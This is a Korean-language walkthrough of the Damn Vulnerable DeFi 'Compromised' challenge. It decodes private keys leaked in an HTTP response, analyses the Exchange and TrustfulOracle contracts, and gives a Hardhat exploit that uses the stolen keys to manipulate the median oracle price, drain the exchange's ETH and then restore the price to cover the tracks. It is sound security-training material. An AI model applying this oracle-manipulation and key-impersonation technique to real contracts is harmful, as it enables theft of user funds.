https://teberr.notion.site/Damn-Vulnerable-Defi-Compromised-1fd2ccaa2ec54df8adcf5dc7923d4384

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/47972a6f-5ae6-4cad-b09c-c712c8104e96/%EB%AC%B8%EC%A0%9C.png)

문제 #7 - Compromised

인기있는 디파이 프로젝트 중 하나의 웹서비스를 탐색하는 중에 서버로 부터 이상한 응답을 받았습니다. 다음은 그 응답의 일부입니다.

```tsx
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

이와 관련된 온체인 거래소에서 DVNFT를 각각 999이더에 팔고 있습니다.

이 가격은 온체인 오라클에서 가져오며 다음 주소들을 기반으로 합니다.

0xA73209FB1a42495120166736362A1DfA9F95A105

0xe92401A4d3af5E446d93D11EEc806b1462b39D15

0x81A5D6E50C214044bE44cA0CB057fe119097850c

0.1이더를 가지고 시작해서 거래소에서 사용가능한 모든 이더를 탈취해야 합니다. 

# 코드 분석 및 공격 설계

문제의 제목인 Compromised는 일반적으로 영어를 공부할 때 타협하다로 많이들 외우지만 ‘해킹’과 관련해서 쓰는 Compromised의 의미는 조금 다르다. 

신용카드가 Compromised 되었다고 하면 복제나 비밀번호 해킹등에 의해서 더이상 사용하면 안되는 상태를 의미한다.

```solidity
4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

두 hex 값으로 되어 있는것을 bytes 값으로 바꾸어 보면 아래와 같다.

```solidity
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5

MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

이를 base64로 디코딩하자. (맨뒤에 =으로 끝나지 않아서 base64인것을 솔직히 바로 알아채지 못했다.)

```solidity
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

두개의 32바이트 값이 나온다. 문제의 Compromised와 연계해서 이 32바이트 값들을 추측해보면 지갑의 개인키로 추측되며 지갑의 개인키가 유출되면 그 지갑을 사칭하여 거래를 진행할 수 있으므로 이를 기억해두자.

## Exchange.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

import "./TrustfulOracle.sol";
import "../DamnValuableNFT.sol";

/**
 * @title Exchange
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Exchange is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public immutable token;
    TrustfulOracle public immutable oracle;

    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);

    constructor(address oracleAddress) payable {
        token = new DamnValuableNFT();
        oracle = TrustfulOracle(oracleAddress);
    }

    function buyOne() external payable nonReentrant returns (uint256) {
        uint256 amountPaidInWei = msg.value;
        require(amountPaidInWei > 0, "Amount paid must be greater than zero");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");

        uint256 tokenId = token.safeMint(msg.sender);
        
        payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);

        emit TokenBought(msg.sender, tokenId, currentPriceInWei);

        return tokenId;
    }

    function sellOne(uint256 tokenId) external nonReentrant {
        require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
        require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");

        token.transferFrom(msg.sender, address(this), tokenId);
        token.burn(tokenId);
        
        payable(msg.sender).sendValue(currentPriceInWei);

        emit TokenSold(msg.sender, tokenId, currentPriceInWei);
    }

    receive() external payable {}
}
```

Exchange 컨트랙트에서는 buyOne 함수와 sellOne 함수가 있다.

```solidity
    function buyOne() external payable nonReentrant returns (uint256) {
        uint256 amountPaidInWei = msg.value;
        require(amountPaidInWei > 0, "Amount paid must be greater than zero");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");

        uint256 tokenId = token.safeMint(msg.sender);
        
        payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);

        emit TokenBought(msg.sender, tokenId, currentPriceInWei);

        return tokenId;
    }
```

buyOne 함수는 다음과 같은 과정을 거친다.

1. buyOne함수를 실행하면서 전송된 이더를 amountPaidInWei에 저장한다.(이 값은 0보다 커야함)
2. 현재가격을 oracle의 token.symbol을 인자로 가져온다.
3. 받은 금액이 현재 가격보다 크거나 같아야 한다.
4. NFT를 msg.sender 에게 발행해주고 tokenId에 id를 저장한다.
5. msg.sender 에게 남은 이더를 거슬러준다.

```solidity
    function sellOne(uint256 tokenId) external nonReentrant {
        require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
        require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");

        token.transferFrom(msg.sender, address(this), tokenId);
        token.burn(tokenId);
        
        payable(msg.sender).sendValue(currentPriceInWei);

        emit TokenSold(msg.sender, tokenId, currentPriceInWei);
    }
```

sellOne함수는 다음과 같은 과정을 거친다.

1. msg.sender는 tokenId에 해당하는 NFT의 소유자여야 한다.
2. token은 Exchange 주소에게 approved 권한이 먼저 진행되어야 한다.
3. 이 컨트랙트에 있는 이더가 현재 가격보다 많으면 msg.sender로 부터 이 컨트랙트로 tokenId에 일치하는 NFT을 전송하고 그 NFT를 소각한다.
4. msg.sender에게 현재 가격 만큼 이더를 전송한다.

## TrustfulOracle.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControlEnumerable.sol";

/**
 * @title TrustfulOracle
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A price oracle with a number of trusted sources that individually report prices for symbols.
 *         The oracle's price for a given symbol is the median price of the symbol over all sources.
 */
contract TrustfulOracle is AccessControlEnumerable {

    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
    bytes32 public constant INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");

    // Source address => (symbol => price)
    mapping(address => mapping (string => uint256)) private pricesBySource;

    modifier onlyTrustedSource() {
        require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
        _;
    }

    modifier onlyInitializer() {
        require(hasRole(INITIALIZER_ROLE, msg.sender));
        _;
    }

    event UpdatedPrice(
        address indexed source,
        string indexed symbol,
        uint256 oldPrice,
        uint256 newPrice
    );

    constructor(address[] memory sources, bool enableInitialization) {
	        require(sources.length > 0);
        for(uint256 i = 0; i < sources.length; i++) {
            _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);
        }

        if (enableInitialization) {
            _setupRole(INITIALIZER_ROLE, msg.sender);
        }
    }

    // A handy utility allowing the deployer to setup initial prices (only once)
    function setupInitialPrices(
        address[] memory sources,
        string[] memory symbols,
        uint256[] memory prices
    ) 
        public
        onlyInitializer
    {
        // Only allow one (symbol, price) per source
        require(sources.length == symbols.length && symbols.length == prices.length);
        for(uint256 i = 0; i < sources.length; i++) {
            _setPrice(sources[i], symbols[i], prices[i]);
        }
        renounceRole(INITIALIZER_ROLE, msg.sender);
    }

    function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
        _setPrice(msg.sender, symbol, newPrice);
    }

    function getMedianPrice(string calldata symbol) external view returns (uint256) {
        return _computeMedianPrice(symbol);
    }

    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) {
        uint256 numberOfSources = getNumberOfSources();
        uint256[] memory prices = new uint256[](numberOfSources);

        for (uint256 i = 0; i < numberOfSources; i++) {
            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
            prices[i] = getPriceBySource(symbol, source);
        }

        return prices;
    }

    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
        return pricesBySource[source][symbol];
    }

    function getNumberOfSources() public view returns (uint256) {
        return getRoleMemberCount(TRUSTED_SOURCE_ROLE);
    }

    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
        uint256 oldPrice = pricesBySource[source][symbol];
        pricesBySource[source][symbol] = newPrice;
        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    }

    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

        // calculate median price
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }

    function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) {
        for (uint256 i = 0; i < arrayOfNumbers.length; i++) {
            for (uint256 j = i + 1; j < arrayOfNumbers.length; j++) {
                if (arrayOfNumbers[i] > arrayOfNumbers[j]) {
                    uint256 tmp = arrayOfNumbers[i];
                    arrayOfNumbers[i] = arrayOfNumbers[j];
                    arrayOfNumbers[j] = tmp;
                }
            }
        }        
        return arrayOfNumbers;
    }
}
```

이 오라클은 주어진 symbol이 주어지면 세 주소에서 가격을 가져와 중간 값으로 설정해준다.

- 0xA73209FB1a42495120166736362A1DfA9F95A105
- 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
- 0x81A5D6E50C214044bE44cA0CB057fe119097850c

모디파이어는 두개가 있으며

- OnlyTrustedSource → msg.sender가 신뢰할 수 있는 source 인지 검증
- OnlyInitializer → msg.sender가 INITIALIZER 역할인지 검증

이 컨트랙트는 함수가 조금 많다.

- setupInitialPrices
- postPrice
- getMedianPrice
- getAllPricesForSymbol
- getPriceBySource
- getNumberOfSources
- _setPrice
- _computeMedianPrice
- _sort

이 함수들은 각각 별개가 아닌 서로 엮여 있으므로 천천히 살펴보자.

### setupInitialPrices

```solidity
 function setupInitialPrices(
        address[] memory sources,
        string[] memory symbols,
        uint256[] memory prices
    ) 
        public
        onlyInitializer
    {
        // Only allow one (symbol, price) per source
        require(sources.length == symbols.length && symbols.length == prices.length);
        for(uint256 i = 0; i < sources.length; i++) {
            _setPrice(sources[i], symbols[i], prices[i]);
        }
        renounceRole(INITIALIZER_ROLE, msg.sender);
    }

```

msg.sender가 INITIALIZER 역할이어야 한다.

source의 길이만큼 하나씩 가져와서 가격을 설정해 준다.

초기 설정이 끝나면 msg.sender의 INITIALIZER 역할을 없앤다.

### postPrice & _setPrice

```solidity
    function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
        _setPrice(msg.sender, symbol, newPrice);
    }
    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
        uint256 oldPrice = pricesBySource[source][symbol];
        pricesBySource[source][symbol] = newPrice;
        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    }
```

msg.sender의 symbol에 맞는 NFT를 새로운 가격으로 설정해주는 함수이다. 

### getMidianPrice & _computeMedianPrice & _sort & getAllPriceForSymbol & getNumberOfSources & getPriceBySource

```solidity
    function getMedianPrice(string calldata symbol) external view returns (uint256) {
        return _computeMedianPrice(symbol);
    }
    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

        // calculate median price
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }
    function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) {
        for (uint256 i = 0; i < arrayOfNumbers.length; i++) {
            for (uint256 j = i + 1; j < arrayOfNumbers.length; j++) {
                if (arrayOfNumbers[i] > arrayOfNumbers[j]) {
                    uint256 tmp = arrayOfNumbers[i];
                    arrayOfNumbers[i] = arrayOfNumbers[j];
                    arrayOfNumbers[j] = tmp;
                }
            }
        }        
        return arrayOfNumbers;
    }
    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) {
        uint256 numberOfSources = getNumberOfSources();
        uint256[] memory prices = new uint256[](numberOfSources);

        for (uint256 i = 0; i < numberOfSources; i++) {
            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
            prices[i] = getPriceBySource(symbol, source);
        }

        return prices;
    }
    function getNumberOfSources() public view returns (uint256) {
        return getRoleMemberCount(TRUSTED_SOURCE_ROLE);
    }

		// Source address => (symbol => price)
    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
        return pricesBySource[source][symbol];
    }
```

전부 한번에 엮여 있는 함수들 이고 이 함수들의 최종적인 목적은 source들로 부터 가격을 불러와서 정렬 후 중간값을 구하는 것이다. 

즉 다음과 같이 구성된다.

1. getMedianPrice로 중간값을 불러오는 함수로 _ComputeMedianPrice를 호출한다.
2. _ComputeMedianPrice 로 중간값을 계산하는 함수이며 이는 getAllPricesForSymbol 함수로 symbol의 모든 가격을 가져와서 정렬 후 짝수 개면 중간 값 두개의 평균을, 홀수개면 중간값을 리턴한다.
3. getAllPricesForSymbol 함수는 Source들을 가져와서 각 source에서의 symbol의 가격을 가져와 price 배열에 담아 리턴해준다.
4. sort함수는 버블 정렬을 이용하여 주어진 배열을 리턴해준다.
5. getPriceBySource는 pricesBysource에 담긴 source에 매칭되어 있는 symbol에서 가격을 가져온다.

## TrustfulOracleInitializer.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrustfulOracle.sol";

/**
 * @title TrustfulOracleInitializer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrustfulOracleInitializer {

    event NewTrustfulOracle(address oracleAddress);

    TrustfulOracle public oracle;

    constructor(
        address[] memory sources,
        string[] memory symbols,
        uint256[] memory initialPrices
    )
    {
        oracle = new TrustfulOracle(sources, true);
        oracle.setupInitialPrices(sources, symbols, initialPrices);
        emit NewTrustfulOracle(address(oracle));
    }
}
```

oracle을 sources 주소들로 초기화 하고 이 주소들은 신뢰할 수 있는 주소들로 설정하며 본인 컨트랙트는 INITIALIZER 권한을 얻게 한다.

이를 바탕으로 source별 symbol(NFT)를 초기 가격들을 초기화한다.

Exchange 컨트랙트에서는 NFT를 사거나 판매할 수 있다. 이 때 NFT를 사거나 판매할 때 측정되는 가격은 세 주소의 가격에 기반하여 sort를 통해 오름차순으로 정렬한 후 중간에 있는 가격으로 결정된다.

즉 가격이 현재 999이더,999이더,999이더 인데 0이더,0이더,999이더로 두 개의 오라클 가격을 조작할수만 있다면 내가 공짜로 이더를 사고 다시 999이더,999이더,999이더로 조작한 후 판매할 수 있다면 999이더를 얻을 수 있다. 

오라클에서 가격을 조작을 하기 위해서는 postPrice 함수를 호출하여 setPrice를 내부적으로 실행해 NFT의 가격을 조작하는 방법밖에는 없는데 문제는 모디파이어가 TrustedSource로 되어 있어 초기에 주어진 세개의 주소가 아니면 조작을 할 수 없게 막아놓았다.

```solidity
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

여기서 아까 얻어내었던 32바이트의 개인키로 추측되는 두개의 값들과 연결해보면 이 값들이 TrustedSource로 설정되어 있는 세개의 주소라면 내가 저 주소들을 사칭해 NFT 가격을 조작(오라클 조작)하여 0이더에 사서 999이더에 파는 과정을 반복할 수 있을 것이다. 

# 공격

세 주소를 사칭해서 가격을 조정할 것이기 때문에 컨트랙트를 작성할 필요가 없다.(그러면 내 컨트랙트의 주소가 msg.sender가 되기 때문)

이제 test 폴더의 compromised.challange.js 에서 테스트를 통해 공격을 실행하자.

```tsx
const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
```

목표는 exchange 컨트랙트의 9990이더를 전부 탈취해서 0이더로 만들고 공격자의 주소에 있는 이더가 9990이더보다 커야하며 공격자는 NFT를 더이상 가지고 있지 않아야 하고 NFT의 가격은 여전히 초기와 같이 999여야 한다.

즉 공격은 다음과 같이 구성하면 된다.

1. 개인키를 이용해 TrustSource를 사칭하여 두 source의 NFT 가격을 각각 0 0으로 만들어 중간값을 0으로 만든다.
2. attacker는 중간값이 0이므로 공짜로 NFT를 살수 있다.
3. 다시 두 source의 NFT의 가격을 9990 9990 (exchange에 있는 이더 양)으로 만들어 중간값을 9990으로 만든다.
4. attacker가 샀던 NFT를 판매하면 exchange에서 9990이더를 탈취할 수 있다.
5. NFT 가격을 원래 가격인 999로 설정해주어 

개인키를 가지고 지갑을 사칭하는 방법은 new ethers.Wallet(개인키,provider)를 이용하면 된다.

![지갑 사칭.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7ee94976-a9c4-4e88-8964-58b151ee6b59/%EC%A7%80%EA%B0%91_%EC%82%AC%EC%B9%AD.png)

```tsx
it('Exploit', async function () {        
        let private_key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        let private_key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

        let compromisedOracle1 = new ethers.Wallet(private_key1,ethers.provider);
        let compromisedOracle2 = new ethers.Wallet(private_key2,ethers.provider);

        let tokenID; 
        await this.oracle.connect(compromisedOracle1).postPrice("DVNFT",0);
        await this.oracle.connect(compromisedOracle2).postPrice("DVNFT",0);
    
        tokenID= await this.exchange.connect(attacker).callStatic.buyOne({value:ethers.utils.parseEther('0.001')});
        await this.exchange.connect(attacker).buyOne({value:ethers.utils.parseEther('0.001')});
        
				await this.nftToken.connect(attacker).approve(this.exchange.address,tokenID);
   
        await this.oracle.connect(compromisedOracle1).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE);
        await this.oracle.connect(compromisedOracle2).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE);

        await this.exchange.connect(attacker).sellOne(tokenID);

        await this.oracle.connect(compromisedOracle1).postPrice("DVNFT",INITIAL_NFT_PRICE );
        await this.oracle.connect(compromisedOracle2).postPrice("DVNFT",INITIAL_NFT_PRICE );
}
```

1. 유출된 개인키를 이용해서 ehters.provider에 연결하여 오라클1,2를 사칭한다.
2. 오라클의 각 DVNFT의 가격을 0으로 설정한다. 이제 이더를 보내면 공짜로 NFT를 살 수 있다.
3. tokenID 값을 받아와야 하는데 트랜잭션을 실행시키면 리턴 값이 트랜잭션이 된다. 따라서 callStatic을 이용하여 트랜잭션의 상태를 변화시키지 않고 실행했을 때의 결과 값을 가져와 tokenID에 저장한다.(판매할 때 tokenID가 필요하므로)
4. 실행했을 때의 결과를 받아왔으니 실제 트랜잭션을 발생시켜서 NFT를 구매한다.
5. 판매를 위해서는 exchange 컨트랙트에게 먼저 approve를 해주어야 하므로 approve를 해준다.
6. 가격을 exchange 컨트랙트에 있는 금액으로 변경시켜 중간값을 9990이더로 바꾸어준다.
7. NFT를 판매하여 exchange 컨트랙트에 있는 모든 이더를 가져온다.
8. 원래 NFT 가격으로 다시 변경시켜주어 흔적을 지운다.

![해결.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/07ecbda8-f9da-442f-abaa-b92dbefe0cee/%ED%95%B4%EA%B2%B0.png)

npm run compromised를 통해 테스트를 실행해보면 Exploit이 정상적으로 잘 진행된 것을 확인할 수 있다.
